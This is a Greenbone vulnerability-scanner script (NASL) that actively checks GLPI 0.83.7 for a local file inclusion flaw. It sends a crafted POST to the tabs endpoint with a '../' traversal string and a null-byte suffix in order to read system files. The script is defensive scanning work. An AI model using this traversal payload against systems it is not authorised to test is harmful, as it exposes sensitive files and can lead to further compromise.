# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:glpi-project:glpi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103743");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-06-20 11:59:55 +0200 (Thu, 20 Jun 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("GLPI <= 0.83.7 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_glpi_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("glpi/http/detected");

  script_tag(name:"summary", value:"GLPI is prone to a local file include (LFI) vulnerability
  because it fails to adequately validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts. This could allow the attacker to
  compromise the application and the computer. Other attacks are also possible.");

  script_tag(name:"affected", value:"GLPI 0.83.7 is vulnerable. Other versions may also be vulnerable.");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5145.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

url = dir + "/ajax/common.tabs.php";

headers = make_array("X-Requested-With", "XMLHttpRequest",
                     "Content-Type", "application/x-www-form-urlencoded");

files = traversal_files();

foreach pattern (keys(files)) {

  ex = "target=/glpi/front/user.form.php&itemtype=" + crap(data: "../", length: 9 * 6) + files[pattern] +
       "%00User&glpi_tab=Profile_User$1&id=2";

  req = http_post_put_req(port: port, url: url, data: ex, add_headers: headers,
                          referer_url: "/glpi/front/user.form.php?id=2");
  res = http_keepalive_send_recv(port: port, data: req);

  if (eregmatch(pattern: pattern, string: res)) {
    report = "It was possible to obtain the file '" + files[pattern] + "'" +
             '\n\nResult:\n\n' + chomp(res);
    security_message(port: port, data: res);
    exit(0);
  }
}

exit(99);
